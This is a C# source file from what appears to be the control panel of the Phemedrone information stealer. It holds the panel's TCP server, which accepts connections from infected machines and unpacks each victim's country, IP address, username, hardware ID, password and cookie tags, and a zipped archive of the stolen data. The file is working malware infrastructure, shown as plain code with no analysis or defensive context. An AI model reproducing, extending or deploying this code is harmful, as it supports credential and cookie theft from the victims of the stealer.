using System.Net;
using System.Net.Sockets;


namespace Phemedrone.Panel
{
    class LogReceivedEventArgs : EventArgs
    {
        public string CountryCode { get; set; }
        public IPAddress IP { get; set; }
        public string Username { get; set; }
        public string logInfo { get; set; }
        public string FileName { get; set; }
        public string HWID { get; set; }
        public string PassTags { get; set; }
        public string CookiesTags { get; set; }
        public string Tag { get; set; }
        public byte[] LogBytes { get; set; }
    }

    class TcpServer
    {
        public delegate void LogReceivedEventHandler(object sender, LogReceivedEventArgs e);

        public event LogReceivedEventHandler OnLogReceived;
        
        private const int MinBufferSize = 1024;

        private TcpListener listener;

        public TcpServer(IPAddress ipAddress, int port)
        {
            listener = new TcpListener(ipAddress, port);
        }

        public void StartServer()
        {
            listener.Start();

            Task.Run(async () =>
            {
                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    HandleClientAsync(client);
                }
            });

        }

        private async Task HandleClientAsync(TcpClient client)
        {
            using (NetworkStream stream = client.GetStream())
            {
                using (var reader = new BinaryReader(stream))
                {
                    var descriptions = new string[0];
                    var descriptionsLength = reader.ReadInt32();

                    for (int i = 0; i < descriptionsLength; i++)
                    {
                        var temp = reader.ReadString();
                        descriptions = descriptions.Append(temp).ToArray();
                    }

                    var archiveLength = reader.ReadInt32();
                    var archiveContent = reader.ReadBytes(archiveLength);

                    
                    
                    OnLogReceived?.Invoke(this, new LogReceivedEventArgs
                    {
                        CountryCode = descriptions[1],
                        IP = IPAddress.Parse(descriptions[2]),
                        Username = descriptions[3],
                        HWID = descriptions[4],
                        FileName = descriptions[5],
                        logInfo = $"{descriptions[6]}:{descriptions[7]}:{descriptions[8]}",
                        PassTags = descriptions[9],
                        CookiesTags = descriptions[10],
                        Tag = descriptions[11],
                        LogBytes = archiveContent
                    });
                }
            }

            client.Close();
        }

    }
}